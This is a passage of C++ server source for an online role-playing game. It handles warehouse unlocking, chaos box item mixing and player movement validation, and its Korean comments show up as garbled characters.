				GCWarehouseStateSend(aIndex, gObj[aIndex].WarehouseLock);
			}
			else
			{
				gObj[aIndex].WarehouseUnfailLock++;
				if( gObj[aIndex].WarehouseUnfailLock > 4 )
				{	// �ټ���° ���и� ���� �����Ų��
					CloseClient(aIndex);
					return;
				}

				GCWarehouseStateSend(aIndex, 10);
			}
#else

#ifdef UPDATE_USERPASSWORD_LENGTH_20090424
			char szJoomin[MAX_JOOMINNUMBER_LENGTH+1];						
			memset( szJoomin, 0 , MAX_JOOMINNUMBER_LENGTH+1);
			memcpy( szJoomin, lpMsg->LastJoominNumber, MAX_JOOMINNUMBER_LENGTH);
#else	// UPDATE_USERPASSWORD_LENGTH_20090424
			char szJoomin[11];						
			memset( szJoomin, 0 , 11);
			memcpy( szJoomin, lpMsg->LastJoominNumber, 10);
#endif	// UPDATE_USERPASSWORD_LENGTH_20090424
			
	#ifdef FOR_TAIWAN
			if( gObjTaiwanJoominCheck(aIndex, szJoomin) == FALSE )
	#else			
			if( gObjJoominCheck(aIndex, szJoomin) == FALSE )
	#endif
			{
				GCWarehouseStateSend(aIndex, 13);
				return;
			}
			else
			{
				gObj[aIndex].WarehouseLock = 0;
				gObj[aIndex].WarehousePW   = 0;
				GCWarehouseStateSend(aIndex, gObj[aIndex].WarehouseLock);
			}
#endif			
		}		
		break;
	}
}

// ī�����ڽ��� �ִ� �������� ������.

#ifdef DARKLORD_WORK
void GCUserChaosBoxSend(LPOBJECTSTRUCT lpObj, int iChaosBoxType)
#else
void GCUserChaosBoxSend(LPOBJECTSTRUCT lpObj)
#endif
{
	PMSG_SHOPITEMCOUNT	pMsg;
#ifdef ITEM_INDEX_EXTEND_20050706
	BYTE				SendByte[2048];
#else
	BYTE				SendByte[1024];
#endif
		
#ifdef DARKLORD_WORK
	if( iChaosBoxType == 1 )
	{
		if( lpObj->m_IfState.type != I_DARK_TRAINER )
		{
			return;
		}		
		if( lpObj->m_IfState.type == I_DARK_TRAINER && lpObj->m_IfState.state == 1 )
		{
			return;
		}
	}else	
#endif
	{
		if( lpObj->m_IfState.type != I_CHAOSBOX )
		{
			return;
		}		
		if( lpObj->m_IfState.type == I_CHAOSBOX && lpObj->m_IfState.state == 1 )
		{
			return;
		}
	}
	int lOfs = sizeof( pMsg );
	
	PHeadSetW((LPBYTE)&pMsg, 0x31, 0);

	pMsg.count			= 0;


#ifdef DARKLORD_WORK
	if( iChaosBoxType == 1 )
	{	// ���û� 
		pMsg.Type			= ITEMMOVE_DARK_TRAINER;
	}
	else
#endif
		pMsg.Type			= ITEMMOVE_CHAOSBOX;

	for( int n=0; n<MAX_CHAOSBOXITEMS; n++)
	{
		if( lpObj->pChaosBox[n].IsItem() == TRUE )
		{
			*(SendByte+lOfs) = n;
			lOfs += 1;
			ItemByteConvert( (SendByte+lOfs), lpObj->pChaosBox[n]);
			lOfs += ITEM_BUFFER_SIZE;
			pMsg.count++;
		}
	}
	pMsg.h.sizeH		= HIBYTE(lOfs);
	pMsg.h.sizeL		= LOBYTE(lOfs);
	memcpy(SendByte, &pMsg, sizeof( pMsg ));
	DataSend(lpObj->m_Index, (LPBYTE)SendByte, lOfs);
}

//----------------------------------------------------------------------------
// [0x86] ī���� �ڽ� �������� �ͽ� ��ư�� ������.
#ifdef 	CHAOS_MIX_UPGRADE
void CGChaosBoxItemMixButtonClick(LPPMSG_CHAOSMIX aRecv, int aIndex)
#else
void CGChaosBoxItemMixButtonClick(int aIndex)
#endif
{


	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddC(LOGC_RED, "error-L3 [%s][%d]", __FILE__,__LINE__);
		return;
	}
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];	

	if( lpObj->ChaosLock == TRUE )
	{
		LogAdd("[%s][%s] Already Used Chaos", lpObj->AccountID, lpObj->Name);
		GCServerMsgStringSend(lMsg.Get(710), lpObj->m_Index, 1);		// "ī���� �������Դϴ�"
		return;
	}

#ifdef PERSONAL_SHOP_20040113		// �ڽ��̳� ������ ���λ����� �������̸� ī���� ������ �� �� ����.
	if (lpObj->m_bPShopOpen == true) {
		LogAdd("[%s][%s] is Already Opening PShop, ChaosBox Failed", lpObj->AccountID, lpObj->Name);
		GCServerMsgStringSend(lMsg.Get(1218), lpObj->m_Index, 1);		// "���λ��� ���� �߿����� ī���� ������ ����Ͻ� �� �����ϴ�."
		return;
	}
#endif


#ifdef CHAOS_MIX_LEVEL_LIMIT
	if( lpObj->Level < 10 )
	{	// ������ �ȵȴ�
		return;
	}
#endif


	PMSG_CHAOSMIXRESULT	pMsg;
	PHeadSetB((LPBYTE)&pMsg, 0x86, sizeof( pMsg ));
	pMsg.Result		= 0x00;	

	// ī���� ���ս� �κ��丮 Ǯ�϶� ���յ� �������� ���� ������ �Ǽ� �������� ���������� ���ϴ� ���� [��� �ڵ�]
	// Ŭ���̾�Ʈ���� 1�������� �ش� ������ �����ϸ� ������, Ȥ�� �� ��Ȳ�� ����Ͽ� ���������� ����ڵ� ����.
	// by natinda 2008/10/15
	// [BEGIN]

#ifdef MODIFY_MIXSYSTEM_BUGFIX_20081016
	if(aRecv->Type == CHAOS_TYPE_UPGRADE_10 || aRecv->Type == CHAOS_TYPE_UPGRADE_11 || aRecv->Type == CHAOS_TYPE_UPGRADE_12 || aRecv->Type == CHAOS_TYPE_UPGRADE_13) {
		
		//��� ���׷��̵忡 �ش� �Ѵ�. �ش� ������ ���׷��̵尡 �ɶ� ��, ��ø���� �䱸 ������ ������ �Ǳ� ������ ���� ���¿��� ���ս� ������ �ɼ� �ִ�.

		int nPlusItemPos = 0;
		int nItemCount = 0;
		// ���� ��� �������� ã�ƺ���..
		for( int n = 0; n < MAX_CHAOSBOXITEMS; n++)	{

			if( lpObj->pChaosBox[n].IsItem() == TRUE ) {

				if( lpObj->pChaosBox[n].m_Level == 9 ) {
					nPlusItemPos = n;
					nItemCount++;
				} else if( lpObj->pChaosBox[n].m_Level == 10 ) {
					nPlusItemPos = n;
					nItemCount++;
				}
#ifdef ITEM_12_13_20040401
				else if( lpObj->pChaosBox[n].m_Level == 11 ) {
						nPlusItemPos = n;
						nItemCount++;
				} else if( lpObj->pChaosBox[n].m_Level == 12 ) {
						nPlusItemPos = n;
						nItemCount++;
				}
#endif
				else {
						// �׿� �۵� .. �� �ʿ� ����. ���� �������� �䱸 ������ ����Ǵ� �������� �������� �Ѵ�. 
				}
			}
		}

		if(nItemCount != 1) {
			// ���ɼ��� ��������, ����� �� �������� 1���� �ƴ� ��� 0 or 1�ʰ� 
			// �� �κ��� Ŭ���̾�Ʈ���� üŷ�� �ϱ� ������ ���� ���ɼ��� ����. ������ Ȥ�� �𸣴�..
			pMsg.Result	= 0x00;  
			DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			return;  // ��� ��� �������� ���� ����. 
		}

		int nWidth = 0, nHeight = 0;

		lpObj->pChaosBox[nPlusItemPos].GetSize(nWidth, nHeight);
		if(CheckInventoryEmptySpace_(lpObj, nHeight, nWidth)) {
			// ���� ������ ���� �Ѵ�. ī���� ������ �ص� ������ ����.
			// ���� ������ Ÿ��.

		} else {
			// ������� ����. 
			pMsg.Result	= 0x00;  
			DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			return;
		}
	}
#endif //MODIFY_MIXSYSTEM_BUGFIX_20081016
// by natinda 2008/10/15 
// [END]

#ifdef CHAOS_MIX_TRANSACTION_BUXFIX_20040610
	lpObj->bIsChaosMixCompleted	= true;		// �ϴ� ���� ��ư�� �����ٸ� �����̵� ���е� ��������� Commit �Ǿ�� �Ѵ�.
#endif


// ī���� ���� Ÿ�� �������� ����
#ifdef CHAOS_MIX_UPGRADE
	int	iMixType = aRecv->Type;

	switch(iMixType)
	{
		case CHAOS_TYPE_DEVILSQUARE:	// �Ǹ��� �� + ����			
			g_MixSystem.DevilSquareItemChaosMix(lpObj);
		break;

		case CHAOS_TYPE_UPGRADE_10:		// +10�����			
			g_MixSystem.PlusItemLevelChaosMix(lpObj, CHAOS_TYPE_UPGRADE_10);
		break;

		case CHAOS_TYPE_UPGRADE_11:		// +11 �����			
			g_MixSystem.PlusItemLevelChaosMix(lpObj, CHAOS_TYPE_UPGRADE_11);			
		break;

	#ifdef ITEM_12_13_20040401
			case CHAOS_TYPE_UPGRADE_12:		// +12 �����			
			g_MixSystem.PlusItemLevelChaosMix(lpObj, CHAOS_TYPE_UPGRADE_12);			
			break;

			case CHAOS_TYPE_UPGRADE_13:		// +13 �����			
			g_MixSystem.PlusItemLevelChaosMix(lpObj, CHAOS_TYPE_UPGRADE_13);			
			break;
	#endif
		
		case CHAOS_TYPE_DINORANT:		// ����Ʈ ����
			g_MixSystem.PegasiaChaosMix(lpObj);
		break;

	#ifdef ADD_FRUIT_N_WING_OF_CHAOS_MIX_20050502
		case CHAOS_TYPE_FRUIT:			// ���� �����
			g_MixSystem.CircleChaosMix(lpObj);
		break;

		case CHAOS_TYPE_SECOND_WING:	 // ���� �����
		
		#ifdef DARKLORD_WORK				
		case CHAOS_TYPE_CLOAK:
		#endif
		
			g_MixSystem.WingChaosMix(lpObj);
		break;

	#endif // ADD_FRUIT_N_WING_OF_CHAOS_MIX_20050502

		case CHAOS_TYPE_BLOODCATLE:		// ������� �����
			g_MixSystem.BloodCastleItemChaosMix(lpObj);
		break;

		case CHAOS_TYPE_DEFAULT:		// �Ϲ� ����		
		case CHAOS_TYPE_FIRST_WING:		// �Ϲ� ���� ����
			g_MixSystem.DefaultChaosMix(lpObj);
		break;


	#ifdef DARKLORD_WORK
			case CHAOS_TYPE_DARKHORSE:		// ��ũȣ�� ����
				g_MixSystem.DarkHorseChaosMix(lpObj);
			break;

			case CHAOS_TYPE_DARKSPIRIT:		// ��ũ���Ǹ� ����
				g_MixSystem.DarkSpiritChaosMix(lpObj);
			break;
	#endif
			

#ifdef ADD_NEW_ITEM_FOR_CASTLE_01_20041116
			case CHAOS_TYPE_BLESS_POTION:	
				g_MixSystem.BlessPotionChaosMix(lpObj);	// (����) �ູ�� ���� ����
				break;

			case CHAOS_TYPE_SOUL_POTION:
				g_MixSystem.SoulPotionChaosMix(lpObj);  // (����) ��ȥ�� ���� ����
				break;

			case CHAOS_TYPE_LIFE_STONE:
				g_MixSystem.LifeStoneChaosMix(lpObj);	// (����) ���������� ����
				break;
#endif
				
#ifdef CASTLE_SPECIAL_ITEMMIX_20050425
			case CHAOS_TYPE_CASTLE_ITEM:	// ���� �������� Ư���ϰ� ���� ������ ������
				g_MixSystem.CastleSpecialItemMix(lpObj);
				break;
#endif

#ifdef HIDDEN_TREASUREBOX_EVENT_20050804	// ������ �������� �̺�Ʈ - ��������
			case CHAOS_TYPE_HT_BOX:
				g_MixSystem.HiddenTreasureBoxItemMix(lpObj);
				break;
#endif

#ifdef ADD_ITEM_FENRIR_01_20051110
			case CHAOS_TYPE_FENRIR_01:
				g_MixSystem.Fenrir_01Level_Mix(lpObj);	// �渱 1�ܰ� - ���Ǹ� ���� ����
				break;
			case CHAOS_TYPE_FENRIR_02:
				g_MixSystem.Fenrir_02Level_Mix(lpObj);	// �渱 2�ܰ� - �η��� ���Ǹ� ����
				break;
			case CHAOS_TYPE_FENRIR_03:
				g_MixSystem.Fenrir_03Level_Mix(lpObj);	// �渱 3�ܰ� - �渱�� ���Ǹ� ����
				break;
			case CHAOS_TYPE_FENRIR_04:
				g_MixSystem.Fenrir_04Upgrade_Mix(lpObj);// �渱 4�ܰ� - �渱�� ���Ǹ� ���׷��̵�
				break;
#endif

#ifdef ADD_SHIELD_POINT_01_20060403
			case CHAOS_TYPE_COMPOUNDPOTION_LV1:
				g_MixSystem.ShieldPotionLv1_Mix(lpObj);
				break;
			case CHAOS_TYPE_COMPOUNTPOTION_LV2:
				g_MixSystem.ShieldPotionLv2_Mix(lpObj);
				break;
			case CHAOS_TYPE_COMPOUNTPOTION_LV3:
				g_MixSystem.ShieldPotionLv3_Mix(lpObj);
				break;
#endif

#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530	
			case CHAOS_TYPE_JEWELOFHARMONY_PURITY:
				g_kJewelOfHarmonySystem.PurityJewelOfHarmony(lpObj);
				break;
			case CHAOS_TYPE_JEWELOFHARMONY_MIX_SMELTINGITEM:
				g_kJewelOfHarmonySystem.MakeSmeltingStoneItem(lpObj);
				break;
			case CHAOS_TYPE_JEWELOFHARMONY_RESTORE_ITEM:
				g_kJewelOfHarmonySystem.RestoreStrengthenItem(lpObj);
				break;
#endif // ADD_JEWEL_OF_HARMONY_SYSTEM_20060530

#ifdef ADD_380ITEM_NEWOPTION_20060711
			case CHAOS_TYPE_380_OPTIONITEM:
				g_kItemSystemFor380.ChaosMix380ItemOption( lpObj );
				break;
#endif // ADD_380ITEM_NEWOPTION_20060711

#ifdef ADD_PCS_LOTTERY_SYSTEM_20070117
			case CHAOS_TYPE_LOTTERY_MIX:
#ifdef MODIFY_PCS_CHAOSMIX_REFACTORING_20070903
				g_MixSystem.ChaosCardMix( lpObj );
#else
				LotteryItemMix( lpObj );
#endif // MODIFY_MIX_SYSTEM_20070518
				break;
#endif // ADD_PCS_LOTTERY_SYSTEM_20070117

#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	// ���� �η縶�� ����� ī���� ����
			case CHAOS_TYPE_ILLUSION_TEMPLE_ITEM:
				g_IllusionTempleEvent.IllusionTempleChaosMixItem(lpObj);
				break;
#endif
#ifdef ADD_THIRD_WING_20070525		// 3������ ���� ��û ����
			case CHAOS_TYPE_THIRD_WING_1:
				g_MixSystem.ThirdWingLevel1_Mix( lpObj );
				break;
			case CHAOS_TYPE_THIRD_WING_2:
				g_MixSystem.ThirdWingLevel2_Mix( lpObj );
				break;
#endif
#ifdef ADD_EVENT_CHERRYBLOSSOM_20080312
			case CHAOS_TYPE_CHERRY_MIX:
				g_MixSystem.CherryBlossomMix( lpObj );
				break;
#endif // ADD_EVENT_CHERRYBLOSSOM_20080312

#ifdef ADD_ITEM_SOCKET_OPTION_MIX_20080415
			case CHAOS_TYPE_SEED_EXTRACT:
				g_MixSystem.MixExtractSeed( lpObj );
				break;
			case CHAOS_TYPE_SEED_COMPOSIT:
				g_MixSystem.MixCompositeSeedSphere( lpObj );
				break;
			case CHAOS_TYPE_SEED_EQUIP:
				g_MixSystem.MixSetSeedSphere( lpObj, aRecv->SubType );
				break;
			case CHAOS_TYPE_SEED_REMOVE:
				g_MixSystem.MixRemoveSeedSphere( lpObj, aRecv->SubType );
				break;
#endif // ADD_ITEM_SOCKET_OPTION_MIX_20080415

		default:	// ���� �ȵ� ����
			LogAddTD("[%s][%s] Undefine chaosmix type detect %d", lpObj->AccountID, lpObj->Name,iMixType);			
		break;
	}
// ī���� ���� Ÿ�� �������� ���� ��
#else	//#ifdef CHAOS_MIX_UPGRADE
	BOOL fail=TRUE;
	BOOL MixResult2;

// Ÿ���� �������� �ʴ� ������ ī���� ���� 
//	PMSG_CHAOSMIXRESULT	pMsg;
//	PHeadSetB((LPBYTE)&pMsg, 0x86, sizeof( pMsg ));
//	pMsg.Result		= 0x00;	

	#ifdef NEW_FORSKYLAND2
//		#ifndef FOR_JAPAN	// �Ϻ��� ��а� (���ȭ �Ŀ���) 2�� ����, ���Ű� ������.
		#ifndef FOR_THAILAND	// �±��� 2�� ����, ���Ű� ������.
			if( g_MixSystem.WingChaosMix(lpObj) == 1 )
			{
				return;
			}

			if( g_MixSystem.CircleChaosMix(lpObj) == 1 )
			{
				return;
			}
		#endif
//		#endif
	#endif

	#ifdef NEW_SKILL_FORSKYLAND
		if( g_MixSystem.PegasiaChaosMix(lpObj) == 1 )
		{
			return;
		}
	#endif

	if( gDevilSquareEvent )
	{	// �Ǹ��� ���� �̺�Ʈ�� ���� ���̸�, �ʴ�� üũ
		int	iEventItemCount;
		int iItemLevel;

		BOOL bret = g_MixSystem.CheckDevilSquareItem(lpObj, iEventItemCount, iItemLevel);

		if( bret )
		{
			if( bret == 3 )
			{	// ������ �ٸ� DQ �������� �ִ�
				pMsg.Result		= 0x07;		
				DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
				LogAdd("[DevilSquare] DiffLevel Devil's Key or Eyes [%d]", iEventItemCount);
				lpObj->ChaosLock = FALSE;
				return;
			}

			if( bret == 2 )
			{	// ȥ���� ����
				pMsg.Result		= 0x07;		
				DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
				LogAdd("[DevilSquare] Not Found Chaos Gem [%d]", iEventItemCount);
				lpObj->ChaosLock = FALSE;
				return;
			}

			if( iEventItemCount > 2 )
			{
				pMsg.Result		= 0x03;		// ����Ǵ� ���� ���� �ʹ� ����
				DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
				LogAdd("[DevilSquare] Too many Devil's Key or Eyes [%d]", iEventItemCount);
				lpObj->ChaosLock = FALSE;
				return;
			}

			if( lpObj->Level < 10 )
			{
				pMsg.Result		= 0x04;		// �Ǹ��� ���� �ʴ�� ������ ���� 10�̻� �Ҽ� �ִ�
				DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
				lpObj->ChaosLock = FALSE;
				return;
			}

			g_MixSystem.DevilSquareEventChaosMix(lpObj, bret, iItemLevel);
			return;
		}
		else if( iEventItemCount > 1 )
		{	
			pMsg.Result		= 0x06;		// �������ǿ� ���� �ʴµ�, ����Ǵ� ���� �ϳ��� ���ԵǾ� �ִ�
			DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			lpObj->ChaosLock = FALSE;
			return;
		}
	}	


	#ifdef FOR_BLOODCASTLE
		// ��õ���Ǽ�, ���庻 üũ
		int iRET_VAL = g_BloodCastle.CheckChoasMixItem(aIndex);

#ifdef ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010	// �� üũ ����
		int iMapNum = g_BloodCastle.GetMapNumByBCBridge( iRET_VAL );

		if (CHECK_BLOODCASTLE( iMapNum ) ) 
		{
#else		
		if (CHECK_BLOODCASTLE(iRET_VAL - 1 + MAP_INDEX_BLOODCASTLE1)) {
#endif
			// Ư�� ������ ����ĳ�� ����� (����) ��ᰡ �ִ�. => ����ĳ�� ������ �Ѵ�.
			g_BloodCastle.BloodCastleChaosMix(aIndex, iRET_VAL);
			lpObj->ChaosLock = FALSE;
			return;
		}
		else {
			// �׿��� ������
			switch(iRET_VAL) {
			case 0 :		// ���� ���� - �̰�쿣 �ϴ� ��������.
				{
				}
				break;
			case 8 :		// �ٸ� �������� ���� -> ������ ī���� �ý������� �ѱ�
				{
	/*				pMsg.Result	= 0x0A;
					DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
					lpObj->ChaosLock = FALSE;
					return;
	*/			}
				break;
			case 9 :		// ������ ������ ��������
				{
					pMsg.Result	= 0x0A;
					DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
					lpObj->ChaosLock = FALSE;
					return;
				}
				break;
			case 10 :		// ȥ���� ����. (ȥ���� ���� �⺻�� �ǹǷ� ī�������� �ʵ�)
				{
					pMsg.Result	= 0x0A;
					DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
					lpObj->ChaosLock = FALSE;
					return;
				}
				break;
			case 11 :		// ���� ī���� ������ �� �ϳ��� ����. (��� �Ѱ��� ����)
				{
					pMsg.Result	= 0x0A;
					DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
					lpObj->ChaosLock = FALSE;
					return;
				}
				break;
			case 12 :		// �̺�Ʈ �������� �ʹ� ����.
				{
					pMsg.Result	= 0x08;
					DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
					lpObj->ChaosLock = FALSE;
					return;
				}
				break;
			case 13 :		// ���տ� �ʿ��� ���� ���ڸ���. (��� ������ ���ϰ����� ���� ���ս� ó�� �ȴ�.)
				{
					pMsg.Result	= 0x0B;
					DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
					lpObj->ChaosLock = FALSE;
					return;
				}
				break;
			case 14 :		// ������ �Ϸ��� ���� ������ ����.
				{
					pMsg.Result	= 0x09;
					DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
					lpObj->ChaosLock = FALSE;
					return;
				}
				break;
			default:
				{
				}
				break;
			}
		}
	#endif	// #ifdef FOR_BLOODCASTLE

	if(	g_MixSystem.PlusItemLevelChaosMix(lpObj) )
		return;

	
	lpObj->ChaosLock = TRUE;

	if( g_MixSystem.ChaosBoxMix(lpObj, MixResult2) == 0 )
	{	// ������ �������� �߸��Ǿ���
		pMsg.Result		= 0x07;		// ������ �������� �߸��Ǿ���
		DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		lpObj->ChaosLock = FALSE;
		return;
	}

	if( lpObj->Money < lpObj->ChaosMoney )
	{
		pMsg.Result		= 0x02;		// ���� ���ڸ���.
		DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		lpObj->ChaosLock = FALSE;
	}
	else 
	{
		if( lpObj->ChaosSuccessRate> 0 ) 
		{
			if( lpObj->ChaosSuccessRate >= 100 ) lpObj->ChaosSuccessRate = 100;
			if( (rand()%100) <= (lpObj->ChaosSuccessRate-1) )
			{
				fail			= FALSE;

				pMsg.Result		= 0x01;
				
				int level = rand()%5;
				int Option1=0, Option2=0, Option3=0;

				if((rand()%100) < (6+(lpObj->ChaosSuccessRate/5)) ) Option1 = 1;
				if((rand()%100) < (4+(lpObj->ChaosSuccessRate/5)) ) Option2 = 1;	// ���� �ٸ��� ��� 

				int optionrand, optionc;

				optionc = (rand()%3);
				optionrand = (rand()%100);

				switch( optionc )
				{
				case 0 :
					if( optionrand < (4+(lpObj->ChaosSuccessRate/5)) ) Option3 = 3;	// �ɼ�
					break;
				case 1 :
					if( optionrand < (8+(lpObj->ChaosSuccessRate/5)) ) Option3 = 2;	// �ɼ�
					break;
				case 2 :
					if( optionrand < (12+(lpObj->ChaosSuccessRate/5)) ) Option3 = 1;	// �ɼ�
					break;
				}
				if( MixResult2 == TRUE )
				{
					int itemindex = rand()%3;
					int itemtype  = 0;
					if( itemindex == 0 ) itemtype = MAKE_ITEMNUM(12,0);
					else if( itemindex == 1 ) itemtype = MAKE_ITEMNUM(12,1);
					else if( itemindex == 2 ) itemtype = MAKE_ITEMNUM(12,2);

	#ifdef CHAOS_MIX_WING_ITEMLEVEL_FIX
						ItemSerialCreateSend(lpObj->m_Index, 255, 0, 0, itemtype, 0, 255, Option1, Option2, Option3);
	#else
						ItemSerialCreateSend(lpObj->m_Index, 255, 0, 0, itemtype, level, 255, Option1, Option2, Option3);
	#endif	// #ifdef CHAOS_MIX_WING_ITEMLEVEL_FIX
				}
				else
				{
					int itemindex = rand()%3;
					int itemtype  = 0;

					if( itemindex == 0 )      itemtype = MAKE_ITEMNUM(2,6);
					else if( itemindex == 1 ) itemtype = MAKE_ITEMNUM(4,6);
					else if( itemindex == 2 ) itemtype = MAKE_ITEMNUM(5,7);
					ItemSerialCreateSend(lpObj->m_Index, 255, 0, 0, itemtype, level, 255, Option1, Option2, Option3);
				}
			}
		}
		
		lpObj->Money -= lpObj->ChaosMoney;
		GCMoneySend(lpObj->m_Index, lpObj->Money);							

		if( fail == TRUE )
		{
			g_MixSystem.ChaosBoxItemDown(lpObj);
			GCUserChaosBoxSend(lpObj);
			DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			LogAddTD("[%s][%s] CBMix Fail %d Money : %d-%d", lpObj->AccountID, lpObj->Name, lpObj->ChaosSuccessRate, lpObj->Money, lpObj->ChaosMoney );		
			lpObj->ChaosLock = FALSE;
		}
		else 
		{
			LogAddTD("[%s][%s] CBMix Success Rate:%d Money : %d", lpObj->AccountID, lpObj->Name, lpObj->ChaosSuccessRate, lpObj->ChaosMoney);
		}
		if( gChaosEvent )
			g_MixSystem.CBUPS_ItemRequest(lpObj->m_Index, lpObj->AccountID, lpObj->Name);
	}	
	gObjInventoryCommit(lpObj->m_Index);
// Ÿ���� �������� �ʴ� ������ ī���� ���� 
#endif	// #ifdef CHAOS_MIX_UPGRADE
}

// [0x87] ī���� �ڽ� ����� ���ƴ�.
void CGChaosBoxUseEnd(int aIndex)
{	
	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddC(LOGC_RED, "error-L3 [%s][%d]", __FILE__,__LINE__);
		return;
	}
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	PMSG_DEFAULT	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x87, sizeof( pMsg ));

	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);

	if( lpObj->m_IfState.use && lpObj->m_IfState.type == I_CHAOSBOX )
	{
		lpObj->m_IfState.use   = 0;
		lpObj->m_IfState.state = 0;
	}
		g_MixSystem.ChaosBoxInit(lpObj);
	gObjInventoryCommit(lpObj->m_Index);

#ifdef MODIFY_CASTLE_NPC_UPGRADE_PROCESS_20060619
	lpObj->m_bIsCastleNPCUpgradeCompleted	= false;
#endif	
}
//----------------------------------------------------------------------------
//
//----------------------------------------------------------------------------

//----------------------------------------------------------------------------
// ������ �̵� ��Ŷ�� ó���Ѵ�.
//----------------------------------------------------------------------------
void PMoveProc(LPPMSG_MOVE lpMove, int aIndex)
{
	PMSG_RECVMOVE	pMove;
	
	short n, pathtable;
	short ax, ay;
	int   sx, sy;	
	
	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) )
	{
		LogAdd("error-L3 : move protocol index error %s %d",__FILE__, __LINE__);
		return;
	}
	LPOBJECTSTRUCT	lpObj = (LPOBJECTSTRUCT)&gObj[aIndex];

	if( lpObj->RegenOk > 0 ) 
	{
		//LogAddL("error-L3 : �����߿� �̵��� �� ����. %s %d", __FILE__, __LINE__);
		//char szTemp[256];
		//wsprintf(szTemp,"������ �̵� ����");
		//GCServerMsgStringSend(szTemp, aIndex, 1);
		return;
	}

#ifdef DARKLORD_WORK	
	if( lpObj->SkillRecallParty_Time )
	{
		lpObj->SkillRecallParty_Time = 0;
		char msg[255];
		wsprintf(msg, lMsg.Get(1254));	// "��ȯ���"

		GCServerMsgStringSend(msg, lpObj->m_Index, 1);			
	}
#endif
		
	// 1�ʿ� 3�� �̻� ���� �ʴ´�..
	if( GetTickCount()-lpObj->m_LastMoveTime < 100 )
	{		
#ifdef FOR_ANTI_HACK
		LogAdd("������ �̵� %d", GetTickCount()-lpObj->m_LastMoveTime);
		if( lpObj->Type == OBJTYPE_CHARACTER  )
		{
			gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);			
		}
		lpObj->m_LastMoveTime = GetTickCount();
#endif
		//char szTemp[256];
		///wsprintf(szTemp,"1�ʿ� 3�� �̻� ����");
		//GCServerMsgStringSend(szTemp, aIndex, 1);		
		
#ifdef ADD_ANTI_HACK_01_20051027
		LogAddTD("[Anti-HACK][PMoveProc][LastMoveTime Error] :(%s)(%s) < 100ms", 
				lpObj->AccountID, lpObj->Name);
#endif
		return;

	}
	if( lpObj->Teleport ) 
	{
		//LogAdd("error-L3 : ���� �̵� �� �̵� ���� %s %d", __FILE__, __LINE__);
		//char szTemp[256];
		//wsprintf(szTemp,"�����̵��� �̵� ����");
		//GCServerMsgStringSend(szTemp, aIndex, 1);		
		return;
	}	

#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
	if( gObjCheckUsedBuffEffect( lpObj, BUFFTYPE_STONE ) == true
		|| gObjCheckUsedBuffEffect( lpObj, BUFFTYPE_STUN ) == true 
#ifdef ADD_SEASON_3_NEW_CHARACTER_SUMMONER_20070912
		|| gObjCheckUsedBuffEffect( lpObj, BUFFTYPE_SLEEP ) == true 
#endif		
	  )
	{
		return;
	}
#else
	#ifdef NEW_FORSKYLAND2
	if( lpObj->m_SkillHarden )	// ��ȭ�� �ɷ� ������ �̵��Ҽ� ����
	{
		gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);
		return;
	}
	#endif
	
	#ifdef ADD_NEW_SKILL_FOR_CASTLE_01_20041116
	if( lpObj->m_iSkillStunTime > 0 )	// ���Ͽ� �ɸ��� �̵��� �� ����.
	{
		gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);
		return;
	}
	#endif
#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
	
	lpObj->m_LastMoveTime = GetTickCount();

	lpObj->m_Rest    = 0;
	lpObj->PathCur   = 0;
	lpObj->Dir       = (lpMove->Path[0]>>4);
	lpObj->PathCount = (lpMove->Path[0]&0x0f);

	//#ifdef _DEBUG
	if( lpObj->PathCount > MAX_ROADPATH )
	{
		LogAdd("error-L3 : Path Count error %d id:%s %s %d", lpObj->PathCount, lpObj->AccountID, __FILE__, __LINE__);
		return;
	}
	for( n=0; n<MAX_ROADPATH; n++)
	{
		lpObj->PathX[n] = 0;
		lpObj->PathY[n] = 0;
		lpObj->PathOri[n] = 0;
	}
	//#endif

	// ���� ��ġ ����
	sx = lpMove->X;
	sy = lpMove->Y;	
	
#ifdef ADD_LOG_CHECK_INVLIDE_X_Y_POSITION_20060131
	if( gObjCheckXYMapTile(lpObj,DBGNAME_PMoveProc) == TRUE )
#ifdef MODIFY_FORCEMOVE_TO_LORENCIA_20060515
	{
		// Path������ ��� Clear�ؾ��Ѵ�.
		lpObj->PathCount = 0;
		lpObj->PathCur = 0;
		// 0524 �߰� ����
		lpObj->PathStartEnd = 0;
		gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);
		return;
	}
#else	// #ifdef MODIFY_FORCEMOVE_TO_LORENCIA_20060515
		return;
#endif // #ifdef MODIFY_FORCEMOVE_TO_LORENCIA_20060515		

#else
	if( gObjCheckXYMapTile(lpObj) == TRUE ) 
		return;
#endif // ADD_LOG_CHECK_INVLIDE_X_Y_POSITION_20060131
	
